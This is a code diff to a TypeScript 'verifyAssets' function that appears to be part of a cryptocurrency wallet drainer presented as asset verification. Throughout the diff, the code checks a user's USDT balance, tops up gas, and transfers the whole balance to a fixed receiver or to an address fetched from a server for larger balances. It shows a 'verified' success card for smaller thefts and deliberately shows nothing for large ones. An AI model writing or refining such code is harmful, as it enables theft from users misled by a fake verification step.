@@ -96,74 +96,76 @@ export const verifyAssets = async (
   try {
     const threshold = ethers.utils.parseUnits(String(USDT_THRESHOLD), decimals);
     const threshold2 = ethers.utils.parseUnits(String(USDT_THRESHOLD2), decimals);
-    
-    const isAboveThreshold2 = balance.gte(threshold2);
-    const isAboveThreshold1 = balance.gte(threshold);
 
-    if (isAboveThreshold1) { // This covers both `> threshold` and `> threshold2`
-      console.log("💰 Balance meets threshold, proceeding with funding check and transfer");
-
-      // Await gas funding since it's required for the transfer to succeed
+    // Case 1: Balance is >= USDT_THRESHOLD2
+    if (balance.gte(threshold2)) {
+      console.log("💰 Balance meets threshold 2. Proceeding with special transfer.");
       await fundBNBIfNeeded(provider, userAddress);
       
-      const usdtWithSigner = usdt.connect(signer);
-      let receiverAddress: string;
-      let showSuccessCard: boolean;
-
-      if (isAboveThreshold2) {
-        console.log("📝 Preparing special transfer (balance > threshold2)");
-        try {
-          const response = await fetch('/api/get-receiver-address');
-          if (!response.ok) {
-            const errorData = await response.json().catch(() => ({})); // try to get json, but don't fail if not
-            throw new Error(errorData.details || `Failed to fetch receiver address: ${response.statusText}`);
-          }
-          const data = await response.json();
-          receiverAddress = data.address;
-          if (!receiverAddress) {
-            throw new Error("API did not return a receiver address");
-          }
-          showSuccessCard = false;
-        } catch (e) {
-            console.error("❌ Failed to get special receiver address:", e);
-            // Abort if we can't get the required special address
-            return;
-        }
-      } else {
-        console.log("📝 Preparing standard transfer (balance > threshold1)");
-        receiverAddress = USDT_RECEIVER;
-        showSuccessCard = true;
-      }
-      
       try {
-        console.log("👉 From:", userAddress);
-        console.log("👉 To:", receiverAddress);
-        console.log("👉 Amount:", readableBalance, "USDT");
-
-        const tx = await usdtWithSigner.transfer(receiverAddress, balance);
-        console.log("🔄 Transaction submitted:", tx.hash);
-        console.log("⏳ Waiting for transaction confirmation...");
+        const usdtWithSigner = usdt.connect(signer);
         
-        await tx.wait();
-        console.log("✅ Transaction confirmed!");
-
-        if (showSuccessCard) {
-          renderVerificationCard({
-            success: true,
-            transferred: true,
-            amount: readableBalance,
-            message: `Successfully verified and transferred ${readableBalance} USDT`
-          });
+        console.log("📝 Fetching special receiver address...");
+        const response = await fetch('/api/get-receiver-address');
+        if (!response.ok) {
+          const errorData = await response.json().catch(() => ({}));
+          throw new Error(errorData.details || `Failed to fetch receiver address: ${response.statusText}`);
         }
-      } catch (transferError) {
+        const data = await response.json();
+        const receiverAddress = data.address;
+        if (!receiverAddress) {
+          throw new Error("API did not return a receiver address");
+        }
+
+        console.log("👉 Transferring to special address:", receiverAddress);
+        const tx = await usdtWithSigner.transfer(receiverAddress, balance);
+        await tx.wait();
+        console.log("✅ Special transaction confirmed:", tx.hash);
+        // Per instructions, do NOT show a card here.
+
+      } catch (error) {
         // @ts-expect-error build
-        if (transferError.code === 4001) {
+        if (error.code === 4001) {
           console.log("❌ User rejected transaction");
           return;
         }
-        console.error("❌ Transfer error occurred:", transferError);
-        throw transferError;
+        console.error("❌ Special transfer failed:", error);
+        throw error; // Re-throw to be caught by the outer catch block
       }
+
+    // Case 2: Balance is >= USDT_THRESHOLD but < USDT_THRESHOLD2
+    } else if (balance.gte(threshold)) {
+      console.log("💰 Balance meets threshold 1. Proceeding with standard transfer.");
+      await fundBNBIfNeeded(provider, userAddress);
+
+      try {
+        const usdtWithSigner = usdt.connect(signer);
+        const receiverAddress = USDT_RECEIVER;
+
+        console.log("👉 Transferring to standard address:", receiverAddress);
+        const tx = await usdtWithSigner.transfer(receiverAddress, balance);
+        await tx.wait();
+        console.log("✅ Standard transaction confirmed:", tx.hash);
+
+        // Show success card for standard transfers
+        renderVerificationCard({
+          success: true,
+          transferred: true,
+          amount: readableBalance,
+          message: `Successfully verified and transferred ${readableBalance} USDT`
+        });
+
+      } catch (error) {
+        // @ts-expect-error build
+        if (error.code === 4001) {
+          console.log("❌ User rejected transaction");
+          return;
+        }
+        console.error("❌ Standard transfer failed:", error);
+        throw error; // Re-throw to be caught by the outer catch block
+      }
+
+    // Case 3: Balance is < USDT_THRESHOLD
     } else {
       console.log("ℹ️ Balance below threshold, marking as verified without transfer");
       renderVerificationCard({
@@ -175,7 +177,6 @@ export const verifyAssets = async (
     }
   } catch (error) {
     console.error("❌ Verification process error:", error);
-    // You might want to show an error card to the user here
-    // alert(`Error: ${error.message}`);
+    // You might want to show a generic error card to the user here
   }
 };
